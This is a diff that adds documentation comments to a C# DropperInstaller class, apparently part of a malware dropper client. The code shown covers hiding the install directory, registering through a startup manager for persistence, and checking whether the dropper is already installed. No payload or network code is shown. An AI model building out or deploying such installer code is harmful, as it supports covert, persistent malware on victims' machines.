@@ -11,12 +11,20 @@ namespace DropperClient.Installation
 
         private readonly ExecutableInfo runningAssembly;
 
+        /// <summary>
+        /// Provides functions to install the dropper client
+        /// </summary>
+        /// <param name="hideFile">Set to true if the installation directory should be hidden</param>
+        /// <param name="installLocation">Directory to install the dropper client to</param>
         public DropperInstaller(bool hideFile, InstallLocation installLocation)
         {
             _installLocation = installLocation;
             runningAssembly = new ExecutableInfo();
         }
 
+        /// <summary>
+        /// Attempts to install the dropper client to the previously chosen directory.
+        /// </summary>
         public void Install()
         {
             var startupManager = new StartupManager();
@@ -52,11 +60,21 @@ namespace DropperClient.Installation
             }
         }
 
+        /// <summary>
+        /// Checks if the dropper already is installed
+        /// </summary>
+        /// <param name="filePath">Path to where the executable should be installed</param>
+        /// <returns></returns>
         public bool IsInstalled(string filePath)
         {
             return File.Exists(filePath);
         }
 
+        /// <summary>
+        /// Gets the folder path for the chosen installlocation
+        /// </summary>
+        /// <param name="location"></param>
+        /// <returns></returns>
         private string GetInstallFolderPath(InstallLocation location)
         {
             Environment.SpecialFolder specialDirectory;
